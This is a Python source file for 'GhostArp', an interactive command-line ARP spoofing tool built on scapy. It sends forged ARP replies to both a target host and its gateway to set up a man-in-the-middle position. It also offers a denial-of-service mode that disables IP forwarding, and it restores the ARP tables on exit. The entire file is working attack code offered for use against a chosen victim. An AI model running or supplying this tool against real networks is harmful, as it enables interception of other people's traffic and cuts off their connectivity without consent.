from scapy.all import *
from art import *
import os
import readline
import rlcompleter

target_ip = ""
target_mac = ""
gateway = ""
host = ""
gateway_mac = ""
DOS = "false"

def spoof_victim():
    arp_response = ARP()
    arp_response.op = 2
    arp_response.pdst = target_ip #Target IP
    arp_response.hwdst = target_mac #Target Mac address
    arp_response.hwsrc = host #Attacker Mac address

    arp_response.psrc = gateway #Router gateway IP
    send(arp_response, verbose=0)

def spoof_router():
    arp_response = ARP()
    arp_response.op = 2
    arp_response.pdst = gateway #Router gateway IP
    arp_response.hwdst = gateway_mac #Router Mac
    arp_response.hwsrc = host #Attacker mac

    arp_response.psrc = target_ip #Target IP
    send(arp_response, verbose=0)

def restore():
# restoring router table
    arp_response = ARP()
    arp_response.op = 2
    arp_response.pdst = gateway #Router IP
    arp_response.hwdst = gateway_mac #Router MAC
    arp_response.hwsrc = target_mac #Target MAC
    arp_response.psrc = target_ip #Target IP
    send(arp_response, verbose=0)
#restoring windows table
    arp_response = ARP()
    arp_response.op = 2
    arp_response.pdst = target_ip #Target IP
    arp_response.hwdst = target_mac #Target MAC
    arp_response.hwsrc = gateway_mac #Router mAC
    arp_response.psrc = gateway #Router IP
    send(arp_response, verbose=0)


def attack():
    try:

        print("Press Ctrl + C to cancel")
        print("Attacking Target in 3 seconds...")
        for i in range(0, 3):
            print('[*] ' + str(3 - i))
            time.sleep(1)
        print("Attack started")
        if DOS == "false":
            os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        if DOS == "true":
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        while True:
            spoof_victim()
            spoof_router()
                
        
    except KeyboardInterrupt as err:
        print("\nrestoring ARP tables")
        restore()
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("exiting")

if __name__ == "__main__":
    Art = text2art("GhostArp", font="graffiti")
    print(Art)
    print("Address Resolution Protocol manipulator")
    print("Author: Logan Goins\n\n")
    

    if not os.geteuid() == 0:
        sys.exit("\nRun as root\n")
    print("Type \"help\" for more information")
    readline.parse_and_bind("tab: complete")    
    readline.set_auto_history(True)
    while True:
        command = input("GhostArp/> ").lower().split(" ")
        print(" ")
        if len(command) >= 3:
            cmd = command[0]
            subcmd = command[1]
            arg = command[2]
            params = [cmd, subcmd, arg]
        elif len(command) >= 2:
            cmd = command[0]
            subcmd = command[1]
            params = [cmd, subcmd]

        elif len(command) >= 1:
            cmd = command[0]
            params = [cmd]
        
        if cmd == "set" and subcmd == "target_ip":
            target_ip = arg

            print("Target IP address <==== " + target_ip)

            print("\n")
 

        if cmd == "set" and subcmd == "target_mac":
            target_mac = arg.upper()
            
            print("Target MAC address <==== " + target_mac)

            print("\n")
 

        if cmd == "set" and subcmd == "gateway":
            gateway = arg

            print("Home gateway IP address <==== " + gateway)

            print("\n")
 

        if cmd == "set" and subcmd == "host":
            host = arg.upper()

            print("Attacker machine MAC address <==== " + host)
            print("\n")



        if cmd == "set" and subcmd == "gateway_mac":
            gateway_mac = arg.upper()

            print("Home gateway MAC address <==== " + gateway_mac)
            print("\n")
 

        if cmd == "set" and subcmd == "dos":
            if arg == "true" or arg == "false":
                DOS = arg
                
                print("Denial of service attack target machine <==== " + DOS)
            else:

                print("Invalid DOS setting\nPlease respond with either \'true\' or \'false\'")

            print("\n")

        if cmd == "run" or cmd == "go" or cmd == "attack":
            attack()
        
        if cmd == "show" and subcmd == "options":
            print("Options: \n-------------------------")
            print("Target IP:                     " + target_ip)
            print("Target MAC:                    " + target_mac)
            print("Router IP address:             " + gateway)
            print("Router MAC address:            " + gateway_mac)
            print("Attacker's MAC address         " + host)
            print("DOS target                     " + DOS)
            print("\n")
           
        if cmd == "help":
            
            print(" \n")
            print("Commands")
            print("--------------------------")
            print("show options                 ---  shows options for ArpGhost")
            print("clear                        ---  clears terminal window")
            print("show title                   ---  prints title screen")
            print("exit                         ---  exits GhostArp")
            print(" ")

            print("Variables")
            print("--------------------------")
            print("Target IP address:                          target_ip")
            print("Target MAC address:                         target_mac")
            print("Router IP address/default gateway           gateway")
            print("Router MAC address                          gateway_mac")
            print("Attacker MAC address                        host")
            print("Denial of service attack selected target    DOS\n")
            
            print("\nAfter configuring desired settings in the options menu type \'run\' to attack")
            print("Set a variable with \'set <variable> <value>\'")
            print("Example: set target_ip 192.168.1.16\n")

    
        if cmd == "exit" or cmd == "quit":
            exit()
        
        if cmd == "show" and subcmd == "title":
            Art = text2art("GhostArp", font="graffiti")
            print(Art)
            print("Author: Logan Goins\n\n")


        if cmd == "clear":
            os.system("clear")

        else:
            "Invalid Command"
